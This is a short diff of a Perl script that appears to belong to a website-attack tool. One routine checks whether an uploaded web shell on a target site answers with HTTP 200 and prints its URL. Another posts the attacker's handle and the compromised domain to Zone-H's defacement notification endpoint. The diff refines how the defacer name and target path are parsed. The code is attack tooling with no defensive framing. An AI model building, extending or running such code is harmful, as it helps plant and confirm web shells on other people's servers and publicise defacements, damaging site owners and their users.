@@ -609,17 +609,22 @@ sub checkUloadedShell {
   $URL.=$validShell;
   my $reShell = $ua->get("$URL");
   if ($reShell->is_success and ($reShell->code eq "200")) {
-    print $c[1]."    SHELL   ".$c[3] . "$URL \n";
+    print $c[1]."    SHELL   ".$c[3].  "$URL \n";
   }
 }
 
 ## ZONE-H
 sub zoneH {
   my ($url, $uploader)=@_;
+  my @zoneD=split("=>", $uploader);
+  $url=getHost($url);
+  $zoneD[0]=~s/\s//ig;
+  $url.=$zoneD[1] if $zoneD[1];
+  $url=~s/\s//ig;
   my $zoneHurl="http://www.zone-h.org/notify/single";
   my $ua = LWP::UserAgent->new;
   my $res = $ua->post($zoneHurl,
-                 Content => ['defacer' => $uploader,
+                 Content => ['defacer' => $zoneD[0],
 				            'domain1' => $url,
 				            'hackmode' => '15',
 				            'reason' => '1',
